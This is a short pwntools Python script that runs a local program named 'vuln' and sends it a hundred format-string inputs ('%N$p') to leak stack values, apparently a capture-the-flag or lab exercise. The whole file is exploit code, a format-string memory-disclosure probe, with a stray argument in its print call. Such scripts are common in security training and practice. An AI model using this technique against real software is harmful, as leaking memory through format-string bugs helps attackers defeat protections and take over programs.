from pwn import *

p = process("./vuln")

p.sendlineafter(b">", b"100")

for i in range(100):
    p.sendlineafter(b"> ",f"%{i}$p")
    print(p.recv(), 1)
